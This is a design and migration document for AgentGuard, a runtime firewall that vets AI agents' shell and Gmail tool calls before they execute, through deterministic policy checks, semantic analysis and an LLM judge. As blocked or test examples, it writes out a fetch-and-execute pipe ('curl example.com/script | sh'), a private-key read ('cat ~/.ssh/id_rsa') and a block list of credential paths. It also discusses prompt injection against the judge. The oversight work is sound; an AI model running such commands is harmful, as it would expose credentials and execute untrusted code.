# AgentGuard Firewall Architecture

Status: target architecture and migration plan  
Last updated: 2026-06-07

The incremental implementation sequence and UI test checkpoints are defined in
[FirewallV2_development_plan.md](FirewallV2_development_plan.md).

## 1. Purpose

This document defines the target architecture for AgentGuard's runtime firewall.

AgentGuard sits between an agent runtime and its tools. Every governed tool call is
intercepted before execution, normalized into a framework-independent action, evaluated
against the agent's effective policy, optionally analyzed by semantic and LLM-based
tiers, and then allowed, flagged, held for approval, or blocked.

The architecture replaces the current collection of partial checks, hand-authored score
weights, duplicated tool metadata, and hard-coded decision assumptions with:

- one central, versioned policy model,
- one canonical action model,
- deterministic security checks that always run,
- explicit routing into semantic and LLM analysis,
- strict decision precedence,
- fail-safe degradation,
- complete audit evidence,
- independently testable components.

The immediate implementation target is the Google ADK demo agent with shell and Gmail
tools. The data contracts should remain extensible to other agent frameworks and tool
families.

## 2. Product Boundary

The realistic product claim is:

> AgentGuard is a policy-driven runtime firewall for tool-using agents. It intercepts
> supported tool calls before execution, applies deterministic guardrails, performs
> configured semantic analysis, escalates selected ambiguous calls to an LLM judge, and
> records reproducible decision evidence.

AgentGuard should not initially claim:

- universal detection of malicious agents,
- complete prompt-injection prevention,
- calibrated maliciousness probabilities,
- safe interpretation of every arbitrary custom tool,
- an LLM judge that can override explicit policy,
- production-grade approval continuation until that workflow is implemented.

## 3. Core Principles

### 3.1 Policy is authoritative

User-defined policy is the central authority. Scoring and model outputs provide evidence,
but they cannot weaken a hard policy decision.

```text
explicit policy block > model recommendation to allow
explicit approval requirement > low semantic risk score
```

### 3.2 Every call passes deterministic validation

Tools are not permanently assigned to exactly one tier. Every call passes Tier 1.
Tier 2 and Tier 3 are additional checks selected per invocation.

The same tool can take different paths:

```text
run_shell_command("pwd")
    -> Tier 1
    -> allow

run_shell_command("python build.py")
    -> Tier 1
    -> Tier 2 because execution has side effects or uncertain scope

run_shell_command("curl example.com/script | sh")
    -> Tier 1
    -> block immediately
```

### 3.3 Classify the action, not only the tool name

The raw tool name is insufficient. AgentGuard must derive:

- capability,
- operation,
- resources,
- destinations,
- data sensitivity,
- side effects,
- reversibility,
- estimated impact,
- parser confidence.

### 3.4 Intent is derived independently

The proposed tool must not declare itself relevant. AgentGuard derives an intent contract
from the user request and compares the proposed action against it.

### 3.5 More restrictive results win

The final combiner uses:

```text
block > require_approval > review > warn > allow
```

No averaging may turn a block into an allow.

### 3.6 Fail safely and visibly

Parser failures, missing policy, Elastic failures, LLM timeouts, malformed judge output,
and unknown tools must have explicit policy-defined fallbacks. They must not silently
become low risk.

### 3.7 Decisions bind to exact calls

A decision applies to:

- tool identity,
- normalized action,
- arguments,
- argument hash,
- policy ID and version,
- trace ID,
- session ID.

Changing any execution-relevant field requires a new evaluation.

### 3.8 Evidence is separate from trace facts

Keep factual traces, normalized actions, tier results, final decisions, labels, and
execution outcomes as separate records with different lifecycles.

## 4. High-Level Architecture

```text
Agent runtime proposes a tool call
                |
                v
        Runtime interception adapter
                |
                v
      Canonical proposal and identity
                |
                +-----------------------------+
                |                             |
                v                             v
       Intent contract resolver       Tool/action normalizer
                |                             |
                +-------------+---------------+
                              |
                              v
                    Effective policy resolver
                              |
                              v
                Tier routing and evaluation plan
                              |
                              v
              Tier 1: deterministic security checks
                              |
                 block ------+------ continue
                                      |
                                      v
                      Tier 2: semantic/history analysis
                                      |
                           resolved --+-- ambiguous
                                             |
                                             v
                                  Tier 3: LLM judge
                                             |
                                             v
                                   Decision combiner
                                             |
                     +-----------------------+-------------------+
                     |                       |                   |
                   allow              require approval         block
                     |                       |                   |
                     v                       v                   v
                  execute              persist pending       do not execute
                     |
                     v
             Post-execution observation
                     |
                     v
       Audit, live events, replay, memory, operations
```

## 5. Central Policy System

### 5.1 What a policy is

A policy document is a versioned declaration of what an agent may do, what requires
additional analysis, what requires human approval, and what is forbidden.

It is configuration, not executable Python code.

The policy schema is standardized across AgentGuard. The values and rules are specific
to a workspace, agent, and deployment.

### 5.2 Policy layers

The effective policy is assembled from multiple layers:

```text
AgentGuard platform baseline
    + workspace or organization policy
    + agent policy
    + deployment/environment overrides
    = effective policy
```

#### Platform baseline

Minimum protections AgentGuard applies to governed runtimes:

- deny unknown high-impact capabilities by default,
- block malformed actions when safe classification is impossible,
- protect credential and secret locations,
- prevent approval reuse for changed arguments,
- always enforce explicit block decisions.

The platform baseline should be small and documented. Customers must know which rules
cannot be disabled.

#### Workspace policy

Rules shared by a customer:

- approved email domains,
- sensitive data classes,
- forbidden network destinations,
- organization-wide transaction limits,
- mandatory approval requirements.

#### Agent policy

Permissions for one logical agent:

- available capabilities,
- allowed filesystem scopes,
- whether the agent may send email,
- whether it may execute shell commands,
- agent-specific limits and routing.

#### Deployment policy

Environment-specific differences:

```text
development: writes allowed under /tmp/agentguard-demo
production: writes require approval
```

### 5.3 Conflict resolution

Policies are merged before runtime evaluation.

Recommended rules:

1. Platform non-overridable rules always remain active.
2. A child layer may make a rule more restrictive.
3. A child layer cannot weaken a non-overridable parent rule.
4. When multiple rules match, the most restrictive effect wins.
5. All matched rule IDs are retained, not only the winning rule.
6. Invalid or conflicting policy documents fail validation before activation.

### 5.4 Policy lifecycle

```text
draft
    -> validate schema
    -> validate referenced capabilities and fields
    -> run policy test cases
    -> preview changes against historical traces
    -> publish immutable version
    -> assign to agent/deployment
    -> activate
    -> observe decisions
    -> supersede with a new version
```

Published versions are immutable. Editing a policy creates a new version.

Historical decisions continue to reference the exact version used at decision time.

### 5.5 How users configure policies

For the demo, policies are checked-in YAML or JSON files. Later, the Policies page should
provide a form-based editor backed by the same schema.

The setup flow should be:

1. Register or discover the agent.
2. Import the tool registry and tool schemas.
3. Map tools to standardized capabilities.
4. Review AgentGuard's proposed metadata and default policy recommendations.
5. Configure resources, limits, destinations, and approval rules.
6. Run generated policy tests.
7. Publish a policy version.
8. Assign it to a deployment.

An LLM may suggest tool metadata or policy templates, but the user must review and
publish them. LLM-generated policy must never activate automatically.

### 5.6 Example policy document

```yaml
schema_version: agentguard.policy.v1
policy_id: pol_google_adk_demo
version: "1.0.0"
name: Google ADK Demo Policy
description: Guardrails for the shell and Gmail demo agent.

scope:
  workspace_id: wsp_agentguard_demo
  agent_id: agt_google_adk_assistant
  deployment_id: dep_google_adk_development

defaults:
  unmatched_tool: block
  unknown_action: require_approval
  parser_failure: require_approval
  semantic_failure: require_approval
  llm_failure: require_approval
  no_rule_match: require_approval

routing:
  read_only:
    tiers: [tier_1]
  reversible_side_effect:
    tiers: [tier_1, tier_2]
  external_or_irreversible:
    tiers: [tier_1, tier_2, tier_3]
  ambiguous:
    tiers: [tier_1, tier_2, tier_3]

rules:
  - rule_id: allow_workspace_inspection
    description: Permit read-only inspection inside the demo workspace.
    match:
      capability: filesystem.read
      resource.path:
        under: /workspace
    effect: allow

  - rule_id: approve_workspace_write
    description: Writes inside the demo workspace require approval.
    match:
      capability: filesystem.write
      resource.path:
        under: /workspace
    effect: require_approval

  - rule_id: block_file_delete
    description: File deletion is forbidden for this agent.
    match:
      capability: filesystem.delete
    effect: block

  - rule_id: block_sensitive_paths
    description: Prevent access to credentials and system configuration.
    match:
      resource.path:
        any_under:
          - ~/.ssh
          - ~/.aws
          - /etc
    effect: block

  - rule_id: block_shell_network
    description: Network access through the shell is prohibited.
    match:
      capability: network.request
      source_tool: run_shell_command
    effect: block

  - rule_id: block_privilege_escalation
    description: Privilege escalation is prohibited.
    match:
      action.flags_contains_any:
        - privilege_escalation
    effect: block

  - rule_id: allow_gmail_read
    description: Inbox search and read are allowed.
    match:
      capability:
        any_of:
          - email.search
          - email.read
    effect: allow

  - rule_id: allow_gmail_draft
    description: Creating an unsent draft is allowed.
    match:
      capability: email.draft
    effect: allow

  - rule_id: block_send_against_intent
    description: Never send when the user constrained the task to drafting.
    match:
      capability: email.send
      intent.forbidden_capabilities_contains: email.send
    effect: block

  - rule_id: approve_email_send
    description: All authorized sends require operator approval.
    match:
      capability: email.send
      resource.recipient_domain:
        in:
          - example.com
    effect: require_approval

  - rule_id: block_unapproved_recipient_domain
    description: Sending outside approved domains is prohibited.
    match:
      capability: email.send
      resource.recipient_domain:
        not_in:
          - example.com
    effect: block
```

### 5.7 Policy schema requirements

The first policy schema should support:

- immutable `policy_id` and semantic `version`,
- ownership scope,
- defaults and failure behavior,
- tier-routing rules,
- capability matching,
- tool matching,
- action flags,
- argument predicates,
- resource path and destination predicates,
- intent predicates,
- session predicates,
- effects,
- user-facing explanations,
- rule severity and optional non-overridable marker,
- policy test cases.

Avoid building a fully general programming language. Implement only typed operators the
runtime can validate and evaluate safely.

## 6. Tool Registration and Capability Model

### 6.1 Why tool metadata is required

AgentGuard cannot standardize arbitrary tool names directly:

```text
send_message
gmail_send_email
mail.dispatch
notify_customer
```

These might all represent external communication. AgentGuard needs a normalized
capability vocabulary.

### 6.2 Tool descriptor

Each registered tool should have a descriptor:

```yaml
tool_id: gmail_send_email
display_name: Send Gmail email
provider: gmail_mcp
capabilities:
  - email.send
side_effect: external_communication
impact: high
reversible: false
argument_schema:
  recipient:
    type: email_address
    resource_role: destination
  subject:
    type: string
  body:
    type: string
    data_role: content
default_routing:
  - tier_1
  - tier_2
  - tier_3
```

### 6.3 Metadata sources

Tool metadata may come from:

1. AgentGuard built-in descriptors for common tools.
2. MCP or framework tool schemas.
3. Developer annotations.
4. User-provided setup information.
5. LLM-assisted suggestions reviewed by the user.

Trust order should favor explicit, reviewed metadata over inferred metadata.

### 6.4 Unknown tools

An unknown tool must not inherit a harmless default.

Recommended behavior:

```text
unknown read-only tool with inspectable schema -> require approval
unknown side-effecting tool -> block
unparseable or missing schema -> block
```

The effective policy may configure stricter behavior.

## 7. Canonical Action Normalization

### 7.1 Purpose

Tier logic should operate on a normalized action rather than framework-specific calls.

Proposed model:

```json
{
  "action_id": "act_...",
  "trace_id": "trace_...",
  "tool_name": "run_shell_command",
  "capabilities": ["filesystem.delete"],
  "operation": "delete",
  "resources": [
    {
      "type": "filesystem_path",
      "value": "/workspace/report.txt",
      "access": "delete",
      "sensitivity": "normal"
    }
  ],
  "destinations": [],
  "side_effect": true,
  "reversible": false,
  "impact": "high",
  "flags": ["destructive"],
  "parser": {
    "name": "shell_v1",
    "version": "1.0.0",
    "confidence": 1.0,
    "unsupported_syntax": false
  },
  "argument_hash": "sha256:..."
}
```

### 7.2 Shell normalizer

The shell normalizer should parse supported syntax and classify:

- read or inspect,
- create,
- write or modify,
- delete,
- execute,
- network request,
- privilege escalation,
- package installation,
- process control,
- sensitive-path access,
- redirection,
- pipelines,
- command substitution,
- unknown behavior.

For the demo, conservative support is preferable to pretending to understand all shell
syntax.

Unsupported side-effecting syntax should produce:

```text
parser confidence: low
flag: unknown_or_unsupported
fallback: require approval or block
```

### 7.3 Gmail normalizer

The Gmail normalizer should classify:

- search,
- read,
- create draft,
- send new email,
- send existing draft,
- recipients and recipient domains,
- attachment presence,
- external destination,
- sensitive-content indicators.

### 7.4 Custom normalizers

Future tool families should implement a common interface:

```python
class ActionNormalizer(Protocol):
    def supports(self, descriptor: ToolDescriptor) -> bool: ...
    def normalize(self, proposal: ToolProposal) -> NormalizedAction: ...
```

## 8. Intent Contract

### 8.1 Purpose

The intent contract describes what the user authorized independently of the proposed
tool.

Proposed fields:

```json
{
  "intent_id": "intent_...",
  "turn_id": "turn_...",
  "requested_capabilities": ["email.search", "email.draft"],
  "forbidden_capabilities": ["email.send"],
  "permitted_resources": [],
  "forbidden_resources": [],
  "destinations": [],
  "side_effect_authorized": true,
  "confirmation_language_present": false,
  "constraints": [
    {
      "type": "negative_action",
      "text": "Do not send it",
      "capability": "email.send"
    }
  ],
  "extractor": {
    "name": "deterministic_intent_v1",
    "confidence": 0.95
  }
}
```

### 8.2 Extraction strategy

Use layers:

1. deterministic phrase and entity extraction,
2. capability mapping from the agent's tool registry,
3. optional structured LLM extraction for unresolved language,
4. schema validation and conservative fallback.

For the demo, deterministic handling should cover:

- read or inspect,
- create or write,
- delete,
- draft,
- send,
- `do not send`,
- `draft only`,
- mentioned paths,
- mentioned recipients and domains.

### 8.3 Intent lifetime

Extract once per user turn and reuse it for all tool proposals generated from that turn.
Do not recompute the intent from each proposed tool.

## 9. Router and Evaluation Plan

### 9.1 Router responsibility

The router does not decide whether a call is safe. It creates an evaluation plan from:

- effective policy,
- normalized action,
- tool descriptor,
- intent contract,
- session state,
- parser confidence,
- deployment environment.

Example:

```json
{
  "required_tiers": ["tier_1", "tier_2"],
  "tier_3_condition": "tier_2.ambiguous_or_high_risk",
  "timeout_ms": 1200,
  "failure_effect": "require_approval",
  "reasons": [
    "reversible_side_effect",
    "semantic_intent_match_required"
  ]
}
```

### 9.2 Routing guidelines

| Action type | Default route |
| --- | --- |
| Known read-only, scoped resource | Tier 1 |
| Reversible local write | Tier 1 + Tier 2 |
| External communication | Tier 1 + Tier 2; Tier 3 if ambiguous |
| Irreversible or high-impact action | Tier 1 + Tier 2 + Tier 3 unless Tier 1 blocks |
| Unknown or parser failure | Policy fallback, usually approval or block |
| Explicit deterministic violation | Tier 1 block; skip later tiers |

Routing is configurable by policy but cannot skip mandatory platform checks.

## 10. Tier 1: Deterministic Security and Policy

### 10.1 Responsibility

Tier 1 evaluates facts that should have deterministic outcomes:

- tool and capability allow/deny lists,
- argument constraints,
- permitted and forbidden resources,
- transaction or amount limits,
- recipient and destination restrictions,
- destructive action flags,
- network restrictions,
- privilege escalation,
- secret and PII handling rules,
- parser failures,
- rate or cumulative-value limits,
- exact user constraints such as `do not send`.

### 10.2 Internal stages

```text
validate proposal schema
    -> normalize resources and destinations
    -> run platform checks
    -> evaluate effective policy rules
    -> produce matched rules and effect
```

### 10.3 Tier 1 result

```json
{
  "tier": "tier_1",
  "status": "completed",
  "recommendation": "block",
  "matched_rules": [
    {
      "policy_id": "pol_google_adk_demo",
      "policy_version": "1.0.0",
      "rule_id": "block_file_delete",
      "effect": "block",
      "explanation": "File deletion is forbidden for this agent."
    }
  ],
  "checks": [
    {
      "check_id": "shell_destructive_action",
      "outcome": "matched"
    }
  ],
  "latency_ms": 2
}
```

### 10.4 Benefits

- deterministic and reproducible,
- low latency,
- easy to test,
- easy to explain,
- cannot be prompt-injected through natural-language reasoning,
- enforces precise business limits.

### 10.5 Shortcomings

- only handles modeled capabilities and predicates,
- brittle if action normalization is wrong,
- cannot reliably resolve subtle semantic intent,
- policy maintenance can become complex,
- overly conservative defaults can create approval fatigue.

### 10.6 PII and secret controls

PII handling is not only a verdict check.

AgentGuard needs separate operations:

- detect sensitive fields,
- redact before storage where required,
- redact before Elastic indexing,
- redact before sending context to Tier 3,
- optionally block unauthorized data movement.

The original value should not be copied into every audit artifact.

## 11. Tier 2: Semantic and Historical Analysis

### 11.1 Responsibility

Tier 2 evaluates context that is difficult to express as exact predicates:

- semantic match between user intent and proposed action,
- argument appropriateness,
- sequence coherence,
- deviation from known valid behavior,
- similarity to approved or blocked precedents,
- possible influence from untrusted tool output,
- cross-domain data movement,
- session-level risk accumulation.

### 11.2 Elastic's role

Elastic is the retrieval and analytics platform, not the final decision-maker.

It can provide:

- filtered historical traces,
- approved and blocked labeled precedents,
- per-agent tool frequencies,
- transition counts,
- argument distributions,
- session history,
- policy-version-specific evidence.

Retrieval must filter by:

- workspace,
- compatible agent or capability,
- deployment/environment where relevant,
- policy version or compatible policy family,
- label quality,
- time range.

### 11.3 Semantic components

The initial Tier 2 can contain:

1. Intent/action similarity.
2. Capability relevance.
3. Sequence rarity.
4. Argument deviation.
5. Precedent retrieval.
6. Untrusted-output influence indicators.
7. Session accumulation.

Each component returns evidence and confidence. Avoid collapsing everything immediately
into one unexplained number.

### 11.4 Tier 2 result

```json
{
  "tier": "tier_2",
  "status": "completed",
  "recommendation": "require_approval",
  "risk_score": 0.71,
  "confidence": 0.78,
  "signals": [
    {
      "signal": "intent_action_mismatch",
      "value": 0.82,
      "explanation": "The user requested drafting, while the action sends externally."
    },
    {
      "signal": "blocked_precedent_similarity",
      "value": 0.88,
      "trace_ids": ["trace_prior_123"]
    }
  ],
  "model_version": "semantic_v1",
  "latency_ms": 38
}
```

### 11.5 Benefits

- handles paraphrases and contextual mismatch,
- uses agent-specific historical behavior,
- detects suspicious sequences missed by isolated rules,
- supports evidence-based escalation,
- improves over a large collection of brittle rules.

### 11.6 Shortcomings

- retrieval quality depends on labels and data coverage,
- learned history can reproduce earlier bad decisions,
- unusual does not necessarily mean harmful,
- similarity scores are not automatically calibrated risk,
- Elastic or model failures introduce availability concerns,
- multi-tenant filtering mistakes can leak evidence.

### 11.7 Tier 2 safety rules

- Prefer human labels over prior automated decisions.
- Never allow Tier 2 to override Tier 1 block or approval.
- Treat missing or low-quality evidence as uncertainty.
- Version feature extraction and models.
- Record all retrieved trace IDs used in a decision.
- Do not call a score a probability unless it is calibrated and validated.

## 12. Tier 3: LLM Judge

Implementation status as of 2026-06-08: a first production-oriented Tier 3 boundary is
implemented under `src/agentguard/firewall_v2/tiers/tier_3/`. It uses Gemini through
`google-genai`, validates structured JSON with Pydantic, records model/prompt metadata,
and fails closed to `require_approval` when the model call, timeout, or schema parse
fails. It can run in shadow mode or feed the V2 combiner when
`AGENTGUARD_TIER3_ENFORCEMENT_ENABLED=true`.

### 12.1 Responsibility

Tier 3 handles ambiguous, consequential calls where deterministic and semantic evidence
do not produce sufficient confidence.

It asks:

- Does the action comply with the applicable guardrails?
- Does it match the current user's intent?
- Are the proposed arguments appropriate and minimally scoped?
- Is approval required because authorization is unclear?

### 12.2 When to invoke it

Use Tier 3 when:

- policy requires it for a capability,
- Tier 2 is ambiguous,
- intent extraction confidence is low,
- semantic evidence conflicts,
- a high-impact action is not already blocked,
- an explanation is needed for a complex approval decision.

Do not invoke it for:

- obvious deterministic allows,
- explicit deterministic blocks,
- every low-risk read call,
- cases where sensitive context cannot be safely provided.

### 12.3 Judge input

The judge receives a sanitized, bounded packet:

- user intent contract,
- normalized action,
- applicable policy rules,
- relevant trajectory summary,
- selected precedents,
- Tier 1 and Tier 2 evidence,
- explicit decision rubric.

It should not receive:

- raw secrets,
- unrelated full conversation history,
- unlimited tool output,
- policy text from untrusted sources,
- arbitrary instructions embedded in retrieved content.

### 12.4 Structured output

```json
{
  "verdict": "require_approval",
  "confidence": 0.82,
  "intent_alignment_score": 0.62,
  "tool_criticality_score": 0.86,
  "necessity_score": 0.55,
  "argument_scope_score": 0.48,
  "policy_compliance_score": 0.70,
  "context_risk_score": 0.40,
  "discovered_criteria": [
    {
      "name": "recipient_social_engineering_risk",
      "score": 0.66,
      "weight": 0.10,
      "rationale": "External recipient and financially sensitive content.",
      "escalates_risk": true
    }
  ],
  "rationale": "The user authorized drafting but did not clearly authorize sending.",
  "uncertainties": [
    "No explicit confirmation to send"
  ],
  "model": "gemini-2.5-flash",
  "prompt_version": "tier3_judge_v1.0.0"
}
```

Validate this output against a strict schema.

Current rubric:

```text
intent alignment                  25%
tool criticality                  20%
necessity                         15%
argument scope                    15%
policy compliance                 15%
context risk                      10%
discovered criteria               audit/escalation only, capped at 20% per item
```

### 12.5 Benefits

- interprets nuanced natural language,
- can reason across policy, intent, action, and trajectory,
- produces useful explanations,
- reduces the need to encode every semantic edge case as a rule.

### 12.6 Shortcomings

- nondeterministic,
- vulnerable to prompt injection and context manipulation,
- adds latency and cost,
- can hallucinate policy or facts,
- confidence values may be poorly calibrated,
- model availability affects routing,
- difficult to reproduce exactly.

### 12.7 Tier 3 constraints

- It cannot override Tier 1.
- Its prompt is generated only from trusted templates.
- Untrusted content is clearly delimited and sanitized.
- Only applicable policy rules are supplied.
- Output must validate or fail closed.
- The model and prompt version are recorded.
- Low confidence defaults to approval for side effects.
- Model failure uses the policy's `llm_failure` effect.

## 13. Final Decision Combiner

Implementation status as of 2026-06-08: `DecisionCombinerV1` exists under
`src/agentguard/firewall_v2/enforcement/combiner.py`. It is deterministic Python code;
it does not call an LLM. Its current conservative configuration caps model-based hard
blocks to `require_approval` unless explicitly enabled later.

### 13.1 Inputs

The combiner receives:

- effective policy,
- Tier 1 result,
- Tier 2 result if run,
- Tier 3 result if run,
- parser and extractor confidence,
- session state,
- tier failures and timeouts.

### 13.2 Precedence

```text
Tier 1 explicit block
    -> block

Tier 1 explicit require_approval
    -> at least require_approval

Any mandatory tier fails
    -> configured failure effect

Tier 2 or Tier 3 recommends block
    -> block only when the effective policy authorizes model-based blocking
    -> otherwise require_approval

Tier 2 or Tier 3 recommends approval
    -> require_approval

All required tiers allow with sufficient confidence
    -> allow or warn
```

Tier 2 and Tier 3 produce recommendations, not independent authority. The effective
policy must define how each recommendation maps to enforcement for a capability. A
conservative initial configuration should use model evidence to escalate an otherwise
permitted call to `require_approval`, reserving `block` for deterministic violations or
explicitly configured high-confidence cases.

Recommended severity order:

```text
allow < warn < review < require_approval < block
```

`review` is useful for offline triage but should map to `require_approval` when the
runtime requires an immediate enforcement action.

### 13.3 Final decision record

The target decision should include:

```json
{
  "decision_id": "dec_...",
  "trace_id": "trace_...",
  "action_id": "act_...",
  "decision": "block",
  "runtime_action": "do_not_execute",
  "policy": {
    "policy_id": "pol_google_adk_demo",
    "version": "1.0.0",
    "effective_policy_hash": "sha256:..."
  },
  "matched_rule_ids": [
    "block_send_against_intent"
  ],
  "tiers_planned": ["tier_1", "tier_2"],
  "tiers_executed": ["tier_1"],
  "tier_result_ids": ["tier_result_..."],
  "argument_hash": "sha256:...",
  "explanation": "The user explicitly requested a draft without sending.",
  "decision_engine_version": "agentguard_decision_v2",
  "latency_ms": 4
}
```

## 14. Enforcement and Approval

### 14.1 Immediate enforcement

```text
allow
    -> execute exact proposed call

warn
    -> execute and record warning

require_approval
    -> do not execute; create pending action

block
    -> do not execute; return blocked response
```

### 14.2 Pending action

A real approval flow must persist:

- pending action ID,
- trace and call IDs,
- normalized action,
- argument hash,
- policy ID and version,
- decision evidence,
- requested approver role,
- creation and expiration times,
- status.

Approval must issue a single-use authorization bound to the exact call. If arguments
change, AgentGuard must re-evaluate.

Until resume is implemented, the demo should clearly state that approval-required calls
are stopped rather than resumable.

### 14.3 Post-execution observation

After allowed execution, record:

- actual execution status,
- latency,
- output summary or reference,
- output sensitivity classification,
- discrepancy between proposed and actual action where observable,
- downstream tool influence.

Post-execution analysis cannot undo an action, but it improves audit, incident response,
and subsequent trajectory decisions.

## 15. Failure and Degradation Matrix

| Failure | Default behavior |
| --- | --- |
| Missing active policy | Block side effects; optionally allow narrowly known reads |
| Invalid policy | Do not activate it; keep prior valid version |
| Unknown tool | Block |
| Tool schema missing | Block side effects |
| Action parser failure | Require approval or block per policy |
| Intent extractor failure | Allow known reads; require approval for side effects |
| Elastic unavailable | Continue Tier 1; apply semantic failure policy |
| No precedents | Mark insufficient evidence; do not assume safe |
| Tier 2 model failure | Apply semantic failure policy |
| Tier 3 timeout | Apply LLM failure policy |
| Tier 3 malformed output | Apply LLM failure policy |
| Session state unavailable | Use stateless checks and configured conservative fallback |
| Persistence failure | Fail closed for high-impact actions |
| Event streaming failure | Enforcement continues; surface degraded observability |

These defaults are starting recommendations. The effective policy may be stricter.

## 16. Audit and Observability

Every interception should provide a timeline:

```text
tool proposed
intent resolved
action normalized
policy resolved
routing planned
tier 1 completed
tier 2 completed or skipped
tier 3 completed or skipped
decision finalized
tool executed / blocked / pending approval / failed
```

The dashboard should show:

- raw tool proposal with redaction,
- normalized capability and resources,
- effective policy and version,
- all matched rules,
- tiers planned and executed,
- tier evidence and failures,
- final decision precedence,
- execution outcome,
- total and per-tier latency.

Do not present heuristic scores as threat probabilities.

## 17. Target Data Contracts

New or revised contracts:

- `ToolDescriptorV1`
- `PolicyDefinitionV1`
- `PolicyRuleV1`
- `EffectivePolicyV1`
- `IntentContractV2`
- `NormalizedActionV1`
- `EvaluationPlanV1`
- `TierResultV1`
- `PolicyMatchV1`
- `GuardDecisionV2`
- `PendingActionV1`
- `ExecutionAuthorizationV1`

Existing records to preserve:

- `AgentGuardTraceV1` as the factual proposal envelope,
- `LiveEventV1`, extended with more event types,
- `SessionRiskStateV1`, redesigned for durable storage,
- `LabelRecordV1` for independent benchmark labels.

### 17.1 Record separation

```text
Trace             what was proposed
Intent contract   what the user authorized
Normalized action what the proposal actually means
Policy snapshot   what rules applied
Tier results      what each analyzer concluded
Decision          what AgentGuard enforced
Execution event   what happened
Label             independent evaluation truth
```

## 18. Proposed Code Structure

```text
src/agentguard/
├── policy/
│   ├── models.py
│   ├── loader.py
│   ├── validator.py
│   ├── resolver.py
│   ├── evaluator.py
│   └── operators.py
├── tools/
│   ├── models.py
│   ├── registry.py
│   ├── normalizer.py
│   └── normalizers/
│       ├── shell.py
│       └── gmail.py
├── intent/
│   ├── models.py
│   ├── deterministic.py
│   └── structured_llm.py
├── guard/
│   ├── firewall.py
│   ├── router.py
│   ├── combiner.py
│   ├── failures.py
│   └── tiers/
│       ├── deterministic.py
│       ├── semantic.py
│       └── llm_judge.py
├── approvals/
│   ├── models.py
│   ├── service.py
│   └── authorization.py
└── audit/
    ├── events.py
    └── redaction.py
```

The exact package names may change, but ownership boundaries should remain clear.

## 19. Current Code Assessment

### 19.1 Reuse

Keep and evolve:

- Google ADK before/after/error callback interception,
- runtime identity and selected-agent ownership fields,
- canonical trace persistence,
- local and Elastic repositories,
- dashboard replay, memory, and operations query patterns,
- force-block testing mode,
- existing decision and live-event UI components.

### 19.2 Restructure

Restructure:

- `AgentGuardFirewallV1` into orchestration around policy, normalization, tiers, and
  combining,
- `ToolRegistry` into reviewed descriptors and normalizer bindings,
- `TraceFeatureBuilderV1` into separate deterministic, semantic, and historical feature
  producers,
- `DecisionPolicyV1` into policy evaluation plus final decision combining,
- `SessionRiskManagerV1` into durable state storage,
- dashboard live event wiring into one authoritative ADK event source.

### 19.3 Replace

Replace:

- the manually weighted placeholder scorer as the source of authority,
- circular task relevance inferred from the proposed tool,
- constant historical statistics,
- phrase handling embedded directly in the ADK adapter,
- duplicated shell metadata,
- policy IDs that do not resolve to actual policy documents,
- broad redaction based only on words such as `secret` or `password`.

### 19.4 Remove or isolate

Remove or isolate after migration:

- obsolete global demo event routes from the real-agent UI,
- duplicate terminal `tool_blocked` events,
- the unused `GoogleADKAdapter.run_session()` placeholder if it has no planned caller,
- the old Python dashboard placeholder under `src/agentguard/dashboard/`,
- baseline names that all instantiate the same guard,
- compatibility models once no active code depends on them.

## 20. Migration Plan

### Phase 0: Runtime correctness

- Wire selected-agent SSE to the real ADK live service.
- Deduplicate terminal events.
- Unify tool metadata.
- Restore session state from storage.
- Add policy and guard version fields without changing decisions.

Exit gate:

- Current behavior remains stable and observable.

### Phase 1: Policy foundation

- Implement policy models, loader, validation, and immutable versions.
- Add one checked-in Google ADK demo policy.
- Resolve effective policy from agent and deployment.
- Store policy snapshot/hash in decisions.
- Implement deterministic rule matching.

Exit gate:

- Changing policy data changes decisions without Python changes.

### Phase 2: Action normalization

- Introduce normalized action contracts.
- Implement shell and Gmail normalizers.
- Bind tool descriptors to normalizers.
- Add conservative unknown behavior.

Exit gate:

- `pwd`, deletion, network access, privilege escalation, Gmail draft, and Gmail send
  produce distinct normalized actions.

### Phase 3: Intent contracts

- Extract deterministic user constraints once per turn.
- Compare actions with requested and forbidden capabilities.
- Move Gmail negative-send phrase logic out of the ADK adapter.

Exit gate:

- Draft-only paraphrases consistently prohibit send.

### Phase 4: Tier 1 integration

- Route every call through deterministic platform and policy checks.
- Make Tier 1 the authoritative enforcement layer.
- Persist matched rule evidence.
- Update dashboard decision details.

Exit gate:

- Supported deterministic security scenarios pass end to end.

### Phase 5: Tier 2

- Add tenant-safe Elastic retrieval.
- Implement real historical statistics.
- Add semantic intent/action features.
- Return explicit evidence and confidence.
- Keep Tier 2 non-authoritative over hard policy.

Exit gate:

- Evaluation demonstrates measurable value over Tier 1 alone.

### Phase 6: Tier 3

- Define judge schema, trusted prompt, sanitizer, timeout, and failure handling.
- Invoke only for configured or ambiguous cases.
- Record model and prompt versions.

Exit gate:

- Judge output is schema-valid, reproducible enough for audit, and never weakens Tier 1.

### Phase 7: Decision V2 and approval

- Implement the new combiner and decision evidence.
- Add durable pending actions and single-use authorization.
- Bind approvals to argument hashes and policy versions.

Exit gate:

- Approval safely resumes or redispatches only the exact approved action.

### Phase 8: Evaluation and rollout

- Build distinct Tier 1, Tier 1+2, and Tier 1+2+3 baselines.
- Add labeled benign and harmful scenarios.
- Measure harmful-call recall, false interventions, approval load, and latency.
- Support shadow mode before enforcement changes.

Exit gate:

- Promotion criteria are based on held-out metrics and safety regression tests.

## 21. Verification Strategy

### 21.1 Policy tests

- schema validation,
- conflict resolution,
- inheritance,
- immutable version behavior,
- most-restrictive-rule precedence,
- historical policy replay.

### 21.2 Normalizer tests

Table-driven shell and Gmail cases:

```text
pwd                              -> filesystem.inspect
cat README.md                    -> filesystem.read
touch notes.txt                  -> filesystem.write
rm notes.txt                     -> filesystem.delete
curl https://example.com         -> network.request
sudo whoami                      -> privilege escalation
cat ~/.ssh/id_rsa                -> sensitive path access
gmail_search_emails              -> email.search
gmail_draft_email                -> email.draft
gmail_send_email                 -> email.send
```

Unsupported syntax must be explicit.

### 21.3 Intent tests

Use paraphrase groups:

```text
Draft it but do not send.
Prepare a reply only.
Leave the response in drafts.
```

All must produce a forbidden `email.send` capability.

### 21.4 Tier tests

Each tier receives fixed inputs and produces schema-valid, versioned results.

Test:

- normal completion,
- no evidence,
- low confidence,
- timeout,
- malformed output,
- dependency failure,
- sensitive input redaction.

### 21.5 Combiner tests

Verify:

- Tier 1 block cannot be overridden.
- Tier 1 approval cannot become allow.
- Tier 2 block outranks Tier 3 allow.
- Mandatory tier failure applies configured fallback.
- All-allow produces allow only with sufficient confidence.

### 21.6 Runtime integration tests

Use spy tools:

- allow executes once,
- warn executes once,
- approval executes zero times,
